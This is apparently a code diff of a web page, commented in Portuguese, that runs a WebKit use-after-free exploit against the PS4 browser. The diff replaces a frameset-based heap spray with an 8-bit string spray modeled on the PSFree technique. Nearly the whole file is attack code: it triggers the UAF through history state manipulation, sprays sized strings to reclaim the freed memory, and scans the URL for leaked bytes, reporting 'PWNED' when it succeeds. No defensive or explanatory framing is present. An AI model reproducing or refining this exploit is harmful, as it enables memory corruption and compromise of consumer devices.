@@ -2,30 +2,46 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit 12.00 - Frameset Spray</title>
+<title>PS4 WebKit - PSFree 8-bit Spray</title>
 <style>
-    body { background-color: #000; color: #0f0; font-family: monospace; }
-    button { padding: 10px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; }
+    body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
+    button { padding: 15px; width: 100%; font-weight: bold; background: #333; color: #fff; border: 1px solid #0f0; cursor: pointer; }
+    #log { border-top: 1px solid #555; margin-top: 20px; padding-top: 10px; }
 </style>
 </head>
 <body>
-<h2>PS4 12.00 - FastMalloc Reclamation (Frameset)</h2>
+<h2>PS4 WebKit - 8-bit String Reclamation (PSFree Method)</h2>
 <div id="status">Pronto</div>
-<button onclick="runFramesetExploit()">INICIAR FRAMESET SPRAY</button>
+<button onclick="run8BitExploit()">INICIAR SPRAY 8-BIT</button>
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
-function log(m) { logEl.innerText += m + "\n"; }
+function log(m) { logEl.innerHTML += m + "<br>"; }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// Mantém os framesets vivos para não liberar a memória
 var keepAlive = [];
 
-async function runFramesetExploit() {
-    logEl.innerText = "";
-    keepAlive = []; // Limpa memória antiga
+// TÉCNICA DO PSFREE.MJS: Forçar String 8-bit
+// Isso evita que o WebKit infle o tamanho para UTF-16
+function create8BitString(len) {
+    // Cria um array de inteiros (Uint8) para garantir bytes únicos
+    const u32 = new Uint32Array(1);
+    const u8 = new Uint8Array(u32.buffer);
+    
+    // Preenche um array grande com 'W' (0x57)
+    // O psfree usa .join("") em um array para criar a string otimizada
+    let arr = new Array(len);
+    for(let i=0; i<len; i++) {
+        arr[i] = "W";
+    }
+    return arr.join("");
+}
+
+async function run8BitExploit() {
+    logEl.innerHTML = "";
+    keepAlive = []; 
 
     // === FASE 1: TRIGGER UAF ===
     statusEl.innerText = "1. Abrindo buraco (UAF)...";
@@ -39,7 +55,6 @@ async function runFramesetExploit() {
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-        
         if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
         finalSize = size;
@@ -47,69 +62,51 @@ async function runFramesetExploit() {
         await sleep(5);
     }
     
-    // Pequena pausa para garantir que o free() ocorreu
     await sleep(50);
     
-    // === FASE 2: FRAMESET SPRAY ===
-    statusEl.innerText = "2. Spraying Framesets...";
-    log(`Tentando ocupar ${finalSize} bytes usando Frameset Rows...`);
+    // === FASE 2: SPRAY 8-BIT (Técnica PSFree) ===
+    statusEl.innerText = "2. Spraying 8-bit Strings...";
+    log(`Tentando ocupar ${finalSize} bytes com Strings 8-bit...`);
 
-    // Cálculo baseado no psfree.mjs: 
-    // Tamanho Alvo / 8 bytes por Length - Overhead
-    const BASE_COMMAS = Math.floor(finalSize / 8); 
+    // No WebKit, strings têm um cabeçalho (StringImpl).
+    // O psfree subtrai 'off.size_strimpl' (0x18 ou 24 bytes).
+    // Vamos varrer tamanhos ao redor do alvo para compensar headers.
     
-    // Vamos usar a técnica "Shotgun" novamente, mas variando o número de vírgulas
-    // Variação de -100 a +100 vírgulas para acertar o alinhamento
-    for(let delta = -100; delta <= 100; delta++) {
-        let count = BASE_COMMAS + delta;
-        let payload = ",".repeat(count);
+    const TARGET = finalSize;
+    
+    // Spray Shotgun: -64 a +64 bytes de variação
+    for(let delta = -64; delta <= 64; delta += 4) {
+        let len = TARGET + delta;
         
-        // Criamos lotes de framesets
-        for(let k=0; k<5; k++) {
-            let f = document.createElement("frameset");
-            f.rows = payload; 
-            keepAlive.push(f);
+        // Criação de 20 strings para cada tamanho
+        for(let k=0; k<20; k++) {
+            // Usando prefixo para unicidade, mas mantendo 8-bit
+            let prefix = "ID" + k;
+            let padding = "W".repeat(len - prefix.length);
+            keepAlive.push(prefix + padding);
         }
     }
 
-    log(`Spray concluído. ${keepAlive.length} framesets criados.`);
-    await sleep(100);
+    log(`Spray concluído. ${keepAlive.length} strings 8-bit criadas.`);
+    await sleep(200);
 
     // === FASE 3: VERIFICAÇÃO ===
     statusEl.innerText = "3. Checando URL...";
     let url = document.URL;
+    let wCount = 0;
     
-    // O frameset preenche a memória com objetos Length.
-    // Na memória bruta, isso se parece com padrões binários repetitivos, não ASCII limpo.
-    // Vamos procurar por algo que NÃO seja 'V' (0x56) e nem 'h' (0x68).
-    
-    let changed = false;
-    let firstChange = -1;
-
-    // Começamos a ler depois do "https://.../#"
-    for(let i = 50; i < 1000; i++) {
-        if(url[i] !== 'V') {
-            changed = true;
-            firstChange = i;
-            break;
-        }
+    // Varredura rápida
+    for(let i=0; i < 2000; i++) {
+        if(url[i] === 'W') wCount++;
     }
 
-    if(changed) {
-        log("!!! SUCESSO CRÍTICO !!!");
-        log(`A memória mudou no offset ${firstChange}!`);
-        log(`O Frameset ocupou o lugar do HistoryItem.`);
-        log("Hex Dump parcial:");
-        
-        let dump = "";
-        for(let i=firstChange; i<firstChange+16; i++) {
-            dump += url.charCodeAt(i).toString(16).padStart(2,'0') + " ";
-        }
-        log(dump);
-        statusEl.innerText = "PWNED: FRAMESET RECLAIM";
+    if(wCount > 50) {
+        log("!!! JACKPOT !!! - MEMÓRIA RECLAMADA");
+        log("Detectamos 'W' na URL. A técnica 8-bit funcionou!");
+        statusEl.innerText = "PWNED: 8-BIT RECLAIM";
     } else {
         log("Falha: Ainda vendo apenas 'V'.");
-        log("Tentativa: Aumente o range do loop de vírgulas (ex: -500 a +500).");
+        log("Debug: O WebKit pode estar usando alocação Large (mmap) que ignora o cache.");
     }
 }
 </script>
